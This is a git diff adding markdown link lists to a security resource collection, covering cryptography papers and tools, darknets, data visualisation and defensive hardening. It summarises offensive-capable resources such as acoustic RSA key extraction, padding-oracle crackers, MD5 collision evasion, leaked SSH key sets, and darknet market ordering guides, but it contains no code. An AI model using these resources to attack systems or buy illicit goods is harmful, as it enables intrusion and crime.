+    possible to achieve ORAM with optimal O (1) communication complexity and
+    only poly-logarithmic user mem- ory. This is a significant improvement over
+    existing work and an independently interesting result. We go on to show that
+    our write- only ORAM is specially equipped to provide hidden volume func-
+    tionality with low overhead and significantly increased security. Fi- nally,
+    we implement HIVE as a Linux kernel block device to show both its
+    practicality and usefulness on existing platforms.
+
+* [A Messy State of the Union: Taming the Composite State Machines of TLS](https://www.smacktls.com/smack.pdf)
+
+  * Abstract — Implementations of the Transport Layer Security (TLS) protocol
+    must handle a variety of protocol versions and extensions, authentication
+    modes and key exchange methods, where each combination may prescribe a
+    different message sequence between the client and the server. We address the
+    problem of designing a robust composite state machine that can correctly
+    multiplex between these different protocol modes. We systematically test
+    popular open-source TLS implementations for state machine bugs and discover
+    several critical security vulnerabilities that have lain hidden in these
+    libraries for years (they are now in the process of being patched). We argue
+    that these vulnerabilities stem from incorrect compositions of individually
+    correct state machines. We present the first verified implementation of a
+    composite TLS state machine in C that can be embedded into OpenSSL and
+    accounts for all its supported ciphersuites. Our attacks expose the need for
+    the formal verifica- tion of core components in cryptographic protocol
+    libraries; our implementation demonstrates that such mechanized proofs are
+    within reach, even for mainstream TLS implementations.
+
+* [Indistinguishability Obfuscation from the Multilinear Subgroup Elimination Assumption](https://eprint.iacr.org/2014/309)
+
+  * Abstract: We revisit the question of constructing secure general-purpose
+    indistinguishability obfuscation (iO), with a security reduction based on
+    explicit computational assumptions over multi- linear maps. Previous to our
+    work, such reductions were only known to exist based on meta- assumptions
+    and/or ad-hoc assumptions: In the original constructive work of Garg et al.
+    (FOCS 2013), the underlying explicit computational assumption encapsulated
+    an exponential family of assumptions for each pair of circuits to be
+    obfuscated. In the more recent work of Pass et al. (Crypto 2014), the
+    underlying assumption is a meta-assumption that also encapsulates an
+    exponential family of assumptions, and this meta-assumption is invoked in a
+    manner that captures the specific pair of circuits to be obfuscated. The
+    assumptions underlying both these works substantially capture (either
+    explicitly or implicitly) the actual structure of the obfuscation mechanism
+    itself. In our work, we provide the first construction of general-purpose
+    indistinguishability obfuscation proven secure via a reduction to a natural
+    computational assumption over multilinear maps, namely, the Multilinear
+    Subgroup Elimination Assumption. This assumption does not depend on the
+    circuits to be obfuscated (except for its size), and does not correspond to
+    the underlying structure of our obfuscator. The technical heart of our paper
+    is our reduction, which gives a new way to argue about the security of
+    indistinguishability obfuscation.
+
+* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
+
+  * Here, we describe a new acoustic cryptanalysis key extraction attack,
+    applicable to GnuPG's current implementation of RSA. The attack can extract
+    full 4096-bit RSA decryption keys from laptop computers (of various models),
+    within an hour, using the sound generated by the computer during the
+    decryption of some chosen ciphertexts. We experimentally demonstrate that
+    such attacks can be carried out, using either a plain mobile phone placed
+    next to the computer, or a more sensitive microphone placed 4 meters away.
+
+* [The SIGMA Family of Key-Exchange Protocols ]()
+
+  * Summary: SIGMA is a family of cryptographic key-exchange protocols that
+    provide perfect forward secrecy via a Diffie-Hellman exchange authenticated
+    with digital signatures. SIGMA is designed to support a variety of features
+    and trade-offs required in common practical scenarios (such as identity
+    protection and reduced number of protocol rounds) as well as to enjoy sound
+    cryptographic security. This design puts forth the "SIGn-and-MAc" (SIGMA,
+    for short) approach that carefully combines the use of digital signatures
+    and MAC functions to guarantee an authenticated binding between the
+    Diffie-Hellman key and the identities of the parties to the exchange. This
+    simple approach resolves security shortcomings found in previous protocols.
+    The SIGMA protocols serve as the cryptographic basis for the signature-based
+    modes of the standardized Internet Key Exchange (IKE) protocol, and its
+    current revision IKE version 2.
+
+### Software
+
+* [CONIKS](https://coniks.cs.princeton.edu/)
+
+  * CONIKS is a key management system for end users capable of integration in
+    end-to-end secure communication services. The main idea is that users should
+    not have to worry about managing encryption keys when they want to
+    communicate securely, but they also should not have to trust their secure
+    communication service providers to act in their interest.
+
+* [The Noise Protocol Framework](http://noiseprotocol.org/noise.html)
+
+  * Noise is a framework for crypto protocols based on Diffie-Hellman key
+    agreement. Noise can describe protocols that consist of a single message as
+    well as interactive protocols.
+
+  * A Noise protocol begins with two parties exchanging handshake messages.
+    During this handshake phase the parties exchange DH public keys and perform
+    a sequence of DH operations, hashing the DH results into a shared secret
+    key. After the handshake phase each party can use this shared key to send
+    encrypted transport messages.
+
+* [VeraCrypt](https://www.veracrypt.fr/en/Home.html)
+
+  * VeraCrypt is a free open source disk encryption software for Windows, Mac
+    OSX and Linux. Brought to you by IDRIX (https://www.idrix.fr) and based on
+    TrueCrypt 7.1a.
+
+### Stenography
+
+* [imagejs](https://github.com/jklmnn/imagejs)
+
+  * imagejs is a small tool to hide javascript inside a valid image file. The
+    image file is recognized as one by content checking software, e.g. the file
+    command you might now from Linux or other Unix based operation systems.
+
+* [Real-time Steganography with RTP](http://uninformed.org/?v=all&a=36&t=sumry)
+
+  * Real-time Transfer Protocol (RTP) is used by nearly all Voice-over-IP
+    systems to provide the audio channel for calls. As such, it provides ample
+    opportunity for the creation of a covert communication channel due to its
+    very nature. While use of steganographic techniques with various audio
+    cover-medium has been extensively researched, most applications of such have
+    been limited to audio cover-medium of a static nature such as WAV or MP3
+    file audio data. This paper details a common technique for the use of
+    steganography with audio data cover-medium, outlines the problem issues that
+    arise when attempting to use such techniques to establish a full-duplex
+    communications channel within audio data transmitted via an unreliable
+    streaming protocol, and documents solutions to these problems. An
+    implementation of the ideas discussed entitled SteganRTP is included in the
+    reference materials.
+
+### Talks
+
+* [Hunting For Vulnerabilities In Signal - Markus Vervier - HITB 2017 AMS](https://www.youtube.com/watch?v=2n9HmllVftA)
+
+  * Signal is the most trusted secure messaging and secure voice application,
+    recommended by Edward Snowden and the Grugq. And indeed Signal uses strong
+    cryptography, relies on a solid system architecture, and you’ve never heard
+    of any vulnerability in its code base. That’s what this talk is about:
+    hunting for vulnerabilities in Signal. We will present vulnerabilities found
+    in the Signal Android client, in the underlying Java libsignal library, and
+    in example usage of the C libsignal library. Our demos will show how these
+    can be used to crash Signal remotely, to bypass the MAC authentication for
+    certain attached files, and to trigger memory corruption bugs. Combined with
+    vulnerabilities in the Android system it is even possible to remotely brick
+    certain Android devices. We will demonstrate how to initiate a permanent
+    boot loop via a single Signal message. We will also describe the general
+    architecture of Signal, its attack surface, the tools you can use to analyze
+    it, and the general threat model for secure mobile communication apps.
+
+### Tools
+
+* [Cryptographic Implementations Analysis Toolkit (CIAT)](http://ciat.sourceforge.net/)
+
+  * The Cryptographic Implementations Analysis Toolkit (CIAT) is compendium of
+    command line and graphical tools whose aim is to help in the detection and
+    analysis of encrypted byte sequences within files (executable and
+    non-executable).
+
+* [Simple crypto tools](http://rumkin.com/tools/)
+* [keyCzar](http://www.keyczar.org/)
+
+  * Keyczar is an open source cryptographic toolkit designed to make it easier
+    and safer for developers to use cryptography in their applications. Keyczar
+    supports authentication and encryption with both symmetric and asymmetric
+    keys.
+
+* [Decrypto](http://sourceforge.net/projects/decrypto/)
+
+  * In DeCrypto you will find a collection of scripts for helping decrypt
+    messages.
+
+* [RELIC](https://github.com/relic-toolkit/relic)
+
+  * RELIC is a modern cryptographic meta-toolkit with emphasis on efficiency and
+    flexibility. RELIC can be used to build efficient and usable cryptographic
+    toolkits tailored for specific security levels and algorithmic choices.
+
+* [quipqiup](http://quipqiup.com/)
+
+  * quipqiup is a fast and automated cryptogram solver by Edwin Olson. It can
+    solve simple substitution ciphers often found in newspapers, including
+    puzzles like cryptoquips (in which word boundaries are preserved) and
+    patristocrats (in which word boundaries aren't).
+
+* [HashID](https://github.com/psypanda/hashID)
+
+  * hashID is a tool written in Python 3 which supports the identification of
+    over 220 unique hash types using regular expressions. It is able to identify
+    a single hash, parse a file or read multiple files in a directory and
+    identify the hashes within them. hashID is also capable of including the
+    corresponding hashcat mode and/or JohnTheRipper format in its output. hashID
+    works out of the box with Python 2 = 2.7.x or Python 3 = 3.3 on any
+    platform.
+
+* [dislocker](https://github.com/Aorimn/dislocker)
+
+  * FUSE driver to read/write Windows' BitLocker-ed volumes under Linux / Mac
+    OSX
+
+* [HiVE — Hidden Volume Encryption](http://hive.ccs.neu.edu/#four)
+* [sheep-wolf](https://github.com/silentsignal/sheep-wolf/)
+
+  * Some security tools still stick to MD5 when identifying malware samples
+    years after practical collisions were shown against the algorithm. This can
+    be exploited by first showing these tools a harmless sample (Sheep) and then
+    a malicious one (Wolf) that have the same MD5 hash. Please use this code to
+    test if the security products in your reach use MD5 internally to
+    fingerprint binaries and share your results by issuing a pull request
+    updating the contents of results.
+
+* [pypadbuster](https://github.com/escbar/pypadbuster)
+
+  * A Python version of PadBuster.pl by Gotham Digital Security (GDSSecurity on
+    Github)
+
+* [padex](https://github.com/szdavid92/padex)
+
+  * The goal of this challenge is to find a flag contained in an encrypted
+    message. A decryption oracle and the encrypted message is provided. The
+    student should write an application that cracks the cyphertext by abusing
+    the oracle which is vulnerable to the padding attack.
+
+* [Project HashClash](https://marc-stevens.nl/p/hashclash/)
+
+  * Project HashClash is a Framework for MD5 & SHA-1 Differential Path
+    Construction and Chosen-Prefix Collisions for MD5. It's goal is to further
+    understanding and study of the weaknesses of MD5 and SHA-1.
+
+* [CPC-MD5](https://github.com/dingelish/cpc-md5)
+
+  * This project is forked from Marc Steven's Hashclash project hashclash and
+    follows GPL.
+
+### Books:
+
+* Cryptography Engineering
+* Applied Cryptography
+
+### Crypto Libraries/Protocols
+
+* [OMEMO Multi-End Message and Object Encryption](https://conversations.im/omemo/)
+
+  * OMEMO is an XMPP Extension Protocol (XEP) for secure multi-client end-to-end
+    encryption. It is an open standard based on a Double Ratchet and PEP which
+    can be freely used and implemented by anyone. The protocol has been audited
+    by a third party.
+
+* [The Legion of the Bouncy Castle](https://www.bouncycastle.org/)
+
+### Miscellaneous
+
+* [SSH Bad Keys](https://github.com/rapid7/ssh-badkeys)
+
+  * This is a collection of static SSH keys (host and authentication) that have
+    made their way into software and hardware products. This was inspired by the
+    Little Black Box project, but focused primarily on SSH (as opposed to TLS)
+    keys.
+
+* [House of Keys](https://github.com/sec-consult/houseofkeys)
diff --git a/source/Darknets.md b/source/Darknets.md
new file mode 100644
index 0000000..bcd1c6c
--- /dev/null
+++ b/source/Darknets.md
@@ -0,0 +1,54 @@
+## Darknets
+
+##### ToC
+
+* [General](#general)
+* [Darknets](#darknets)
+* [Discussions](#discussion)
+* [Ordering](#ordering)
+* [Markets/Sites/Wikis](#markets)
+* [Tools](#tools)
+
+### General
+
+* Don't think that because information posted here is valid/trustworthy. This is
+  a dumping spot for my personal reference. This does not mean that
+  markets/sites I post are legit/safe.
+
+* 101
+
+  * [Touring the Darkside of the Internet. An Introduction to Tor - Defcon22](https://www.youtube.com/watch?v=To5yarfAg_E)
+
+  * [Darknet Dictionary ](http://www.deepdotweb.co/2014/03/02/deepdotwebs-darknet-dictionary/)
+
+  * [Darknets intro vid - educational](https://www.youtube.com/watch?v=tjJYC2LuJl0)
+
+  * [For Darknet Noobs](https://www.reddit.com/r/DarkNetMarketsNoobs)
+
+### Documentation
+
+* [Tor black-market-related arrests](http://www.gwern.net/Black-market%20arrests#evolution)
+* I compiled a table and discussion of all known arrests and prosecutions
+  related to Tor-Bitcoin black-markets such as Silk Road 1, along with
+  discussion of how they came to be arrested.
+
+### Educational
+
+* [Ordering Checklist](https://www.reddit.com/r/DarkNetMarketsNoobs/wiki/completeorderingchecklist)
+
+* [Site list: (NO CP)](http://belsec.skynetblogs.be/deepnet-the-tor-onion-directory-of-things-that-work-today.html)
+* [Deep Dot Web](http://www.deepdotweb.co/)
+
+### Markets
+
+* [Market Discussions](https://www.reddit.com/r/DarkNetMarkets)
+
+### Tools
+
+* [Tor Search engine.](https://ahmia.fi/search/)
+
+### Darknets
+
+* Freenet
+* I2P
+* Tor
diff --git a/source/Data-Analysis-Visualization.md b/source/Data-Analysis-Visualization.md
new file mode 100644
index 0000000..f3e781c
--- /dev/null
+++ b/source/Data-Analysis-Visualization.md
@@ -0,0 +1,211 @@
+# Data Visualization
+
+### ToC
+
+* Cull
+* General
+* Writeups
+* Tools
+* Miscellaneous
+
+### To Do
+
+* Split into Data visualization/Working with data
+
+#### Cull
+
+* [Just-Metadata](https://github.com/ChrisTruncer/Just-Metadata)
+
+  * Just-Metadata is a tool that can be used to gather intelligence information
+    passively about a large number of IP addresses, and attempt to extrapolate
+    relationships that might not otherwise be seen. Just-Metadata has "gather"
+    modules which are used to gather metadata about IPs loaded into the
+    framework across multiple resources on the internet. Just-Metadata also has
+    "analysis" modules. These are used to analyze the data loaded Just-Metadata
+    and perform various operations that can identify potential relationships
+    between the loaded systems.
+
+- [Apache Nifi](https://nifi.apache.org/)
+
+  * supports powerful and scalable directed graphs of data routing,
+    transformation, and system mediation logic.
+
+- http://linkurio.us/toolkit/
+
+- http://marvl.infotech.monash.edu/webcola/
+
+- http://www.yasiv.com/graphs#Bai/rw496
+
+- http://plaso.kiddaland.net/
+
+- http://secviz.org/
+
+- http://sourceforge.net/projects/rapidminer/
+
+- http://orange.biolab.si/
+
+- https://rapidminer.com/
+
+- http://ipython.org/
+
+- https://www.documentcloud.org/home
+
+- http://www.pentaho.com/
+
+- [Applied Security Visualization](http://www.secviz.org/content/applied-security-visualization)
+
+- [Scriptorium-LE](https://github.com/imifos/Scriptorium-LE/)
+
+  * A Linux machine state enumeration, data visualisation and analysis tool.
+
+---
+
+### Tools
+
+* [d3js(Data Driven Documents)](http://d3js.org/)
+
+  * D3.js is a JavaScript library for manipulating documents based on data. D3
+    helps you bring data to life using HTML, SVG, and CSS. D3’s emphasis on web
+    standards gives you the full capabilities of modern browsers without tying
+    yourself to a proprietary framework, combining powerful visualization
+    components and a data-driven approach to DOM manipulation.
+
+* [Data Science Toolkit](https://github.com/petewarden/dstk)
+
+  * A collection of the best open data sets and open-source tools for data
+    science, wrapped in an easy-to-use REST/JSON API with command line, Python
+    and Javascript interfaces. Available as a self-contained VM or EC2 AMI that
+    you can deploy yourself.
+  * [Documentation](http://www.datasciencetoolkit.org/developerdocs)
+
+* [ORA](http://www.casos.cs.cmu.edu/projects/ora/)
+
+  * ORA is a dynamic meta-network assessment and analysis tool developed by
+    CASOS at Carnegie Mellon. It contains hundreds of social network, dynamic
+    network metrics, trail metrics, procedures for grouping nodes, identifying
+    local patterns, comparing and contrasting networks, groups, and individuals
+    from a dynamic meta-network perspective.
+  * ORA has been used to examine how networks change through space and time,
+    contains procedures for moving back and forth between trail data (e.g. who
+    was where when) and network data (who is connected to whom, who is connected
+    to where …), and has a variety of geo-spatial network metrics, and change
+    detection techniques.
+  * ORA can handle multi-mode, multi-plex, multi-level networks. It can identify
+    key players, groups and vulnerabilities, model network changes over time,
+    and perform COA analysis. It has been tested with large networks (106 nodes
+    per 5 entity classes).Distance based, algorithmic, and statistical
+    procedures for comparing and contrasting networks are part of this toolkit.
+    Based on network theory, social psychology, operations research, and
+    management theory a series of measures of “criticality” have been developed
+    at CMU. Just as critical path algorithms can be used to locate those tasks
+    that are critical from a project management perspective, the
+  * ORA algorithms can find those people, types of skills or knowledge and tasks
+    that are critical from a performance and information security perspective.
+
+* [pewpew](https://github.com/hrbrmstr/pewpew)
+
+  * In all seriousness, IPew provides a simple framework - based on Datamaps -
+    for displaying cartographic attack data in a (mostly) responsive way and
+    shows how to use dynamic data via javascript event timers and data queues
+    (in case you're here to learn vs have fun - or both!). You can customize the
+    display through a myriad of query string options, including sounds.
+
+* [Data Maps](https://datamaps.github.io/)
+
+  * Customizable SVG map visualizations for the web in a single Javascript file
+    using D3.js
+
+* [Import.IO](https://import.io/)
+
+  * Use our tool to build APIs to all your favorite websites with just a few
+    clicks of the mouse. - Data Scraping
+
+* [kippo-graph](https://github.com/ikoniaris/kippo-graph)
+
+  * Visualize statistics from a Kippo SSH honeypot
+
+* [simgaJS-webcola](https://github.com/qinfchen/sigmajs-webcola)
+
+  * webcola plugin for sigmajs
+
+* [Airodump-NG Scan Visualizer](http://hackoftheday.securitytube.net/2015/03/airodump-ng-scan-visualizer-ver-01.html)
+* [Graphite - Scalable Realtime Graphing](http://graphite.wikidot.com/start)
+
+  * [Quick Start Guide](http://graphite.wikidot.com/quickstart-guide)
+
+* [StatsD](https://github.com/etsy/statsd/)
+
+  * A network daemon that runs on the Node.js platform and listens for
+    statistics, like counters and timers, sent over UDP or TCP and sends
+    aggregates to one or more pluggable backend services (e.g., Graphite).
+
+* [Kismet Log Viewer - KLV](http://mindflip.org/klv/)
+
+  * The Kismet Log Viewer (KLV) takes Kismet .xml log files and produces a
+    nicely formatted html interface to browse the logs with. KLV has the ability
+    to utilize available GPS information to create links for external maps via
+    the net, and provides the ability for those with Snort to generate a page of
+    Snort output for each specific bssid that has data available. KLV also comes
+    with my Kismet Log Combiner script to help users consolidate multiple .xml
+    and .dump log files.
+
+* [plaso](https://github.com/log2timeline/plaso)
+
+  * plaso (Plaso Langar Að Safna Öllu) is a Python-based backend engine for the
+    tool log2timeline.
+
+* [huginn](https://github.com/huginn/huginn)
+
+  * Create agents that monitor and act on your behalf. Your agents are standing
+    by! Huginn is a system for building agents that perform automated tasks for
+    you online. They can read the web, watch for events, and take actions on
+    your behalf. Huginn's Agents create and consume events, propagating them
+    along a directed graph. Think of it as a hackable version of IFTTT or Zapier
+    on your own server. You always know who has your data. You do.
+
+* [Norikra](http://norikra.github.io/)
+
+  * Norikra is a open source server software provides "Stream Processing" with
+    SQL, written in JRuby, runs on JVM, licensed under GPLv2.
+
+* [Fluentd](https://www.fluentd.org/architecture)
+
+  * Fluentd is an open source data collector, which lets you unify the data
+    collection and consumption for a better use and understanding of data.
+
+### Modeling Network Data
+
+* [Flowsynth](https://github.com/secureworks/Flowsynth)
+
+  * Flowsynth is a tool for rapidly modelling network traffic. Flowsynth can be
+    used to generate text-based hexdumps of packets as well as native libpcap
+    format packet captures.
+
+### Blogposts
+
+### Writeups
+
+* [Generalizing Data Flow Information](http://uninformed.org/?v=all&a=34&t=sumry)
+
+  * Generalizing information is a common method of reducing the quantity of data
+    that must be considered during analysis. This fact has been plainly
+    illustrated in relation to static data flow analysis where previous research
+    has described algorithms that can be used to generalize data flow
+    information. These generalizations have helped support more optimal data
+    flow analysis in certain situations. In the same vein, this paper describes
+    a process that can be employed to generalize and persist data flow
+    information along multiple generalization tiers. Each generalization tier is
+    meant to describe the data flow behaviors of a conceptual software element
+    such as an instruction, a basic block, a procedure, a data type, and so on.
+    This process makes use of algorithms described in previous literature to
+    support the generalization of data flow information. To illustrate the
+    usefulness of the generalization process, this paper also presents an
+    algorithm that can be used to determine reachability at each generalization
+    tier. The algorithm determines reachability starting from the least specific
+    generalization tier and uses the set of reachable paths found to
+    progressively qualify data flow information for each successive
+    generalization tier. This helps to constrain the amount of data flow
+    information that must be considered to a minimal subset.
+
+* [Using amCharts to Create Beautiful Wireshark Visualizations](http://www.thevisiblenetwork.com/2015/03/19/using-amcharts-to-create-beautiful-wireshark-visualizations/)
+* [Drawing effective network diagrams](https://www.auvik.com/media/blog/effective-network-diagrams/)
diff --git a/source/Defense.md b/source/Defense.md
new file mode 100644
index 0000000..5e5d54a
--- /dev/null
+++ b/source/Defense.md
@@ -0,0 +1,248 @@
+# Defense:
+
+#### In Progress
+
+* https://github.com/KurtDeGreeff/awesome-windows-domain-hardening
+
+* https://github.com/k4m4/kickthemout
+
+* https://github.com/iadgov/Secure-Host-Baseline
+
+* [git-secrets](https://github.com/awslabs/git-secrets)
+
+  * Prevents you from committing passwords and other sensitive information to a
+    git repository.
+
+* [keynuker](https://github.com/tleyden/keynuker)
+
+  * KeyNuker scans public activity across all Github users in your Github
+    organization(s) and proactively deletes any AWS keys that are accidentally
+    leaked. It gets the list of AWS keys to scan by directly connecting to the
+    AWS API.
+
+* https://github.com/gfoss/PSRecon
+
+* [Securing Windows with Group Policy Josh Rickard - Derbycon7](https://www.youtube.com/watch?v=Upeaa2rgozk&index=66&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+
+* https://github.com/silverhack/voyeur
+
+* https://github.com/intrigueio/intrigue-core
+
+* https://github.com/nbs-system/naxsi
+
+* https://github.com/ernw/hardening
+
+* https://www.youtube.com/watch?v=7XnkDsOZM3Y&index=16&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3
+
+* https://www.malwarearchaeology.com/logging/
+
+* https://github.com/iadgov/Secure-Host-Baseline
+
+* https://technet.microsoft.com/library/security/4053440
+
+* https://criticalinformatics.com/how-i-learned-to-trust-my-shell-microsoft-powershell/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=7832f4ea811a4bc7b33409dacf81eb7f&uid=150127534&nid=244+281088008
+
+* https://github.com/palantir/osquery-configuration/blob/master/README.md
+
+* https://github.com/refractionpoint/limacharlie
+
+* https://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf
+
+* https://www.blackhillsinfosec.com/build-super-secure-active-directory-infrastructure/
+
+* https://www.blackhillsinfosec.com/the-creddefense-toolkit/
+
+* [Simple WMI Trace Viewer in PowerShell](https://chentiangemalc.wordpress.com/2017/03/24/simple-wmi-trace-viewer-in-powershell/)
+
+* [ESA-Process-Maturity](https://github.com/Brockway/ESA-Process-Maturity)
+
+  * Tools to measure the maturity of Enterprise Security Architecture processes
+  * https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project
+
+* [Active Directory: Real Defense for Domain Admins](https://www.irongeek.com/i.php?page=videos/derbycon4/t213-active-directory-real-defense-for-domain-admins-jason-lang)
+
+  * Did your AD recently get owned on a pentest? It’s always fun to see an
+    unknown entry show up in your Domain Admins group (#fail). Come learn how to
+    truly protect your organization’s IT crown jewels from some of the most
+    popular AD attacks. If you’re stuck trying to figure out what to do with
+    null sessions, pass the hash techniques, or protecting your Domain Admins,
+    then you will want to be here.
+
+* [Active Directory Design Best Practices](https://krva.blogspot.com/2008/04/ad-design-best-practices.html)
+
+* [Application Whitelisting Using Microsoft AppLocker](https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm)
+
+* [Just Enough Administration Samples and Resources](https://github.com/PowerShell/JEA)
+
+  * Just Enough Administration (JEA) is a PowerShell security technology that
+    provides a role based access control platform for anything that can be
+    managed with PowerShell. It enables authorized users to run specific
+    commands in an elevated context on a remote machine, complete with full
+    PowerShell transcription and logging. JEA is included in PowerShell version
+    5 and higher on Windows 10 and Windows Server 2016, and older OSes with the
+    Windows Management Framework updates.
+
+* [Detecting DLL Hijackingon Windows](http://digital-forensics.sans.org/blog/2015/03/25/detecting-dll-hijacking-on-windows/)
+
+* [Second section good resource for hardening windows](http://labs.bitdefender.com/2014/11/do-your-bit-to-limit-cryptowall/)
+
+* [GPO Best Policies](http://www.grouppolicy.biz/best-practices/)
+
+* http://www.scriptjunkie.us/2013/06/fixing-pass-the-hash-and-other-problems/
+
+* [Analyzing Malicious Documents Cheat Sheet](https://zeltser.com/analyzing-malicious-documents/)
+
+* https://www.dsinternals.com/en/
+
+* [Monit](https://mmonit.com/monit/)
+
+  * Monit is a small Open Source utility for managing and monitoring Unix
+    systems. Monit conducts automatic maintenance and repair and can execute
+    meaningful causal actions in error situations.
+
+* [Mitigating Kerberos Golden Tickets:](http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf)
+
+* https://sysforensics.org/2014/01/know-your-windows-processes.html
+
+* https://media.blackhat.com/us-13/US-13-Duckwall-Pass-the-Hash-Slides.pdf
+
+  * Protecting against Pass-The-Hash and other techniques
+
+http://www.grouppolicy.biz/2011/06/best-practices-group-policy-for-wsus/
+
+* [Decryptonite](https://github.com/DecryptoniteTeam/Decryptonite)
+
+  * Decryptonite is a tool that uses heuristics and behavioural analysis to
+    monitor for and stop ransomware.
+
+* [BEAMGUN](https://github.com/JLospinoso/beamgun)
+
+  * A rogue-USB-device defeat program for Windows.
+
+* [Defending against mimikatz](https://jimshaver.net/2016/02/14/defending-against-mimikatz/)
+
+* [Mitigating Pass-the-Hash Attacks and other credential Theft-version2](http://download.microsoft.com/download/7/7/A/77ABC5BD-8320-41AF-863C-6ECFB10CB4B9/Mitigating-Pass-the-Hash-Attacks-and-Other-Credential-Theft-Version-2.pdf)
+
+  * Official MS paper.
+
+* [Windows Firewall Hook Enumeration](https://www.nccgroup.com/en/blog/2015/01/windows-firewall-hook-enumeration/)
+
+  * We’re going to look in detail at Microsoft Windows Firewall Hook drivers
+    from Windows 2000, XP and 2003. This functionality was leveraged by the
+    Derusbi family of malicious code to implement port-knocking like
+    functionality. We’re going to discuss the problem we faced, the required
+    reverse engineering to understand how these hooks could be identified and
+    finally how the enumeration tool was developed.
+
+* [Windows ISV Software Security Defenses](https://msdn.microsoft.com/en-us/library/bb430720.aspx)
+
+* [Harden windows IP Stack](https://www.reddit.com/r/netsec/comments/2sg80a/how_to_harden_windowsiis_ssltls_configuration/)
+
+* [The 10 Windows group policy settings you need to get right](http://www.infoworld.com/article/2609578/security/the-10-windows-group-policy-settings-you-need-to-get-right.html?page=2)
+
+* [Windows Performance Toolkit Reference](http://msdn.microsoft.com/en-us/library/windows/hardware/hh162945.aspx)
+
+* [Powershell Security at Enterprise Customers](https://blogs.msdn.microsoft.com/daviddasneves/2017/05/25/powershell-security-at-enterprise-customers/)
+
+* [AIL framework - Analysis Information Leak framework](https://github.com/CIRCL/AIL-framework)
+
+  * AIL is a modular framework to analyse potential information leaks from
+    unstructured data sources like pastes from Pastebin or similar services or
+    unstructured data streams. AIL framework is flexible and can be extended to
+    support other functionalities to mine sensitive information.
+
+* [Linux workstation security checklist](https://github.com/lfit/itpol/blob/master/linux-workstation-security.md)
+
+* [Uproot](https://github.com/Invoke-IR/Uproot)
+
+  * Uproot is a Host Based Intrusion Detection System (HIDS) that leverages
+    Permanent Windows Management Instrumentation (WMI) Event Susbcriptions to
+    detect malicious activity on a network. For more details on WMI Event
+    Subscriptions please see the WMIEventing Module
+
+* [What would a real hacker do to your Active Directory](https://www.youtube.com/watch?v=DH3v8bO-NCs)
+
+* [Mozilla's OpenSSH Configuration guide](https://wiki.mozilla.org/Security/Guidelines/OpenSSH)
+
+  * Use Invoke-HoneyCreds to distribute fake cred throughout environment as
+    "legit" service account and monitor for use of creds
+
+* [SMB Packet Signing](https://technet.microsoft.com/en-us/library/cc180803.aspx)
+
+* [Public:Windows Event Log Zero 2 Hero Slides](https://docs.google.com/presentation/d/1dkrldTTlN3La-OjWtkWJBb4hVk6vfsSMBFBERs6R8zA/edit#slide=id.g21acf94f3f_2_27)
+
+* [Blocking Remote Use of Local Accounts](https://blogs.technet.microsoft.com/secguide/2014/09/02/blocking-remote-use-of-local-accounts/)
+
+* http://www.leeholmes.com/blog/2016/10/22/more-detecting-obfuscated-powershell/
+
+* [The Hitchhiker's Guide to SQL Injection prevention](https://phpdelusions.net/sql_injection)
+* [Amazon S3 Bucket Public Access Considerations](https://aws.amazon.com/articles/5050)
+* [Filenames and Pathnames in Shell: How to do it Correctly](https://www.dwheeler.com/essays/filenames-in-shell.html)
+* [Threats and Countermeasures Guide: Security Settings in Windows Server 2008 R2 and Windows 7 - technet](https://technet.microsoft.com/en-us/library/hh125921.aspx)
+* [Securi-Tay 2017 - Advanced Attack Detection](https://www.youtube.com/watch?v=ihElrBBJQo8)
+* [Common misconfigurations that lead to a breach - Justin Tharpe](https://www.youtube.com/watch?v=fI3mycr5cPg)
+* [Securing Windows Workstations: Developing a Secure Baseline](https://adsecurity.org/?p=3299)
+* [PowerShell Security at Enterprise Customers - msdn](https://blogs.msdn.microsoft.com/daviddasneves/2017/05/25/powershell-security-at-enterprise-customers/)
+
+* [Assimilator](https://github.com/videlanicolas/assimilator)
+
+  * Automatic firewall rule orchestator.
+
+* [Uproot](https://github.com/Invoke-IR/Uproot)
+
+  * Uproot is a Host Based Intrusion Detection System (HIDS) that leverages
+    Permanent Windows Management Instrumentation (WMI) Event Susbcriptions to
+    detect malicious activity on a network. For more details on WMI Event
+    Subscriptions please see the WMIEventing Module
+
+* [WMIEvent](https://github.com/Invoke-IR/WMIEvent)
+
+  * A PowerShell module to abstract the complexities of Permanent WMI Event
+    Subscriptions
+
+* [LUNAR](https://github.com/lateralblast/lunar)
+
+  * A UNIX security auditing tool based on several security frameworks
+
+* [OverSight](https://objective-see.com/products/oversight.html)
+
+  * OverSight monitors a mac's mic and webcam, alerting the user when the
+    internal mic is activated, or whenever a process accesses the webcam.
+
+* [Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory](http://adsecurity.org/?p=1515)
+* [How to Efficiently Protect AD from Credential Theft & Compromise - Friedwart Kuhn - Troopers15](https://www.youtube.com/watch?v=I4mb0UciqlY)
+* [Defending the Enterprise Against Network Infrastructure Attacks - Paul Coggin - Troopers15](https://www.youtube.com/watch?v=K0X3RDf5XK8)
+* [Kerberos Golden Ticket: Mitigating pass the ticket on Active Directory](http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf)
+
+* [TaskExplorer](https://objective-see.com/products/taskexplorer.html)
+
+  * Explore all the tasks (processes) running on your Mac with TaskExplorer.
+
+* [Password Policy - technet](https://technet.microsoft.com/en-us/library/hh994572.aspx)
+* [Account lockout threshold - technet](https://technet.microsoft.com/en-us/library/hh994574.aspx)
+* [Guide to Application Whitelisting - NIST Special Publication 800 - 167](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-167.pdf)
+* [Script Rules in AppLocker - technet](https://technet.microsoft.com/en-us/library/ee460958.aspx)
+* [DLL Rules in AppLocker](https://technet.microsoft.com/en-us/library/ee460947.aspx)
